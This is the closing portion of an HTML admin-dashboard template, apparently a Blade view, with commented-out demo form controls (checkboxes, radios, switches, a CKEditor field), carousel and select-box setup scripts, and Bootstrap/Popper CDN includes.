                                                        <input name="sample-checkbox-01" id="checkbox-01" value="1" type="checkbox" checked />
                                                        I agree to the terms &#38; conditions.
                                                 
                                                    </label>
                                                    <label class="label_check" for="checkbox-02">
                                                        <input name="sample-checkbox-02" id="checkbox-02" value="1" type="checkbox" />
                                                        Please send me regular updates.
                                                    </label>
                                                    <label class="label_check" for="checkbox-03">
                                                        <input name="sample-checkbox-02" id="checkbox-03" value="1" type="checkbox" />
                                                        This is nice checkbox.</label>
    
                                                </div>
                                                <div class="radios">
                                                    <label class="label_radio" for="radio-01">
                                                        <input name="sample-radio" id="radio-01" value="1" type="radio" checked />
                                                        This is option A...
                                                 
                                                    </label>
                                                    <label class="label_radio" for="radio-02">
                                                        <input name="sample-radio" id="radio-02" value="1" type="radio" />
                                                        and this is option B...
                                                 
                                                    </label>
                                                    <label class="label_radio" for="radio-03">
                                                        <input name="sample-radio" id="radio-03" value="1" type="radio" />
                                                        or simply choose option C
                                                 
                                                    </label>
                                                </div>
                                            </form>
                                        </div>
    
                                    </section>
    
                                    <section class="panel">
                                        <header class="panel-heading">
                                            Switch
                                     
                                        </header>
                                        <div class="panel-body">
                                            <div class="row m-bot15">
                                                <div class="col-sm-6 text-center">
                                                    <input type="checkbox" checked="" data-toggle="switch" />
                                                </div>
                                                <div class="col-sm-6 text-center">
                                                    <input type="checkbox" data-toggle="switch" />
                                                </div>
                                            </div>
                                            <div class="row m-bot15">
                                                <div class="col-sm-6 text-center">
                                                    <div class="switch switch-square"
                                                        data-on-label="<i class=' icon-ok'></i>"
                                                        data-off-label="<i class='icon-remove'></i>">
                                                        <input type="checkbox" />
                                                    </div>
                                                </div>
                                                <div class="col-sm-6 text-center">
                                                    <div class="switch switch-square"
                                                        data-on-label="<i class=' icon-ok'></i>"
                                                        data-off-label="<i class='icon-remove'></i>">
                                                        <input type="checkbox" checked="" />
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="row">
                                                <div class="col-sm-6 text-center">
                                                    <input type="checkbox" disabled data-toggle="switch" />
                                                </div>
                                                <div class="col-sm-6 text-center">
                                                    <input type="checkbox" checked disabled data-toggle="switch" />
                                                </div>
                                            </div>
                                        </div>
                                    </section>
    
    
                                </div>
                            </div>
    
                            <div class="row">
                                <div class="col-lg-12">
                                    <section class="panel">
                                        <header class="panel-heading">
                                            CKEditor
                                     
                                        </header>
                                        <div class="panel-body">
                                            <div class="form">
                                                <form action="#" class="form-horizontal">
                                                    <div class="form-group">
                                                        <label class="control-label col-sm-2">CKEditor</label>
                                                        <div class="col-sm-10">
                                                            <textarea class="form-control ckeditor" name="editor1" rows="6"></textarea>
                                                        </div>
                                                    </div>
                                                </form>
                                            </div>
                                        </div>
                                    </section>
                                </div>
                            </div>
                        </div>
                    </div>
                    <!-- page end-->
                </section> --}}
            </section>
  </section>


  <script>

      //owl carousel

      $(document).ready(function() {
          $("#owl-demo").owlCarousel({
              navigation : true,
              slideSpeed : 300,
              paginationSpeed : 400,
              singleItem : true

          });
      });

      //custom select box

      $(function(){
          $('select.styled').customSelect();
      });

  </script>
<script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.2/dist/umd/popper.min.js" integrity="sha384-IQsoLXl5PILFhosVNubq5LC7Qb9DXgDA9i+tQ8Zj3iwWAwPtgFTxbJ8NT4GN1R8p" crossorigin="anonymous"></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.min.js" integrity="sha384-cVKIPhGWiC2Al4u+LWgxfKTRIcfu0JTxR+EQDz/bgldoEyl4H0zUF0QKbrJ0EcQF" crossorigin="anonymous"></script>
  </body>
</html>